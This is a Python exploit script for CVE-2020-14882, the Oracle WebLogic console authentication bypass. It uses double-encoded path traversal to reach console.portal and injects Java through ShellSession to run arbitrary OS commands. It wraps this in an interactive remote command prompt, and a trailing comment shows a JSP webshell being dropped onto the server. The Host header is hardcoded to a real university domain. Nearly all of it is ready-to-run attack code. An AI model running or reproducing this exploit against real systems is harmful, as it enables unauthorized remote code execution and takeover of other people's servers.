#!/usr/bin/python3
import requests
import sys
import http.client
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
# -*- coding: utf-8 -*-

banner = """
▒█▀▀█ ▒█░░▒█ ▒█▀▀▀ ░░ █▀█ █▀▀█ █▀█ █▀▀█ ░░ ▄█░ ░█▀█░ ▄▀▀▄ ▄▀▀▄ █▀█ 
▒█░░░ ░▒█▒█░ ▒█▀▀▀ ▀▀ ░▄▀ █▄▀█ ░▄▀ █▄▀█ ▀▀ ░█░ █▄▄█▄ ▄▀▀▄ ▄▀▀▄ ░▄▀ 
▒█▄▄█ ░░▀▄▀░ ▒█▄▄▄ ░░ █▄▄ █▄▄█ █▄▄ █▄▄█ ░░ ▄█▄ ░░░█░ ▀▄▄▀ ▀▄▄▀ █▄▄

                         Research: Jang
                   C0de by Base4Sec - @s1kr10s
"""
print(banner)
# Post Review - https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf

if sys.argv:
	host = sys.argv[1]
	port = sys.argv[2]

path = "/console/images/..%252fconsole.portal"
path = "/console/css/%252e%252e%252fconsole.portal"
path = "/console/css/%25%32%65%25%32%65%25%32%66console.portal"
url = "http://{}:{}{}".format(host, port, path)


echo_exp = '''weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String cmd = req.getHeader("cmd");
String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
if (cmd != null) {
    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream(), "UTF-8").useDelimiter("\\\\A").next();
    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
    res.getServletOutputStream().flush();
    res.getWriter().write("");
}
executeThread.interrupt();'''
while True:
	cmd = input("$cmd> ")
	payload = '_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("{exp}");'.format(exp=echo_exp)
	headers = {
	    "User-Agent": "Mozilla", 
	    "Host": "mosaic.mcmaster.ca",
	    "Accept-Encoding": "gzip, deflate",
	    "cmd": cmd, 
	    "Content-Type": "application/x-www-form-urlencoded"
	}

	try:
		print("Sent...")
		response = requests.post(url=url, data=payload, headers=headers, stream=True)
		print(response.text.encode().decode('utf-8'))
	except:
		print("Fail server ({}).".format(host))
		exit()



# String[] cmd={"cmd.exe","/c","echo shell_code>../../../wlserver/servers/lib/consoleapp/webapp/images/test.jsp"}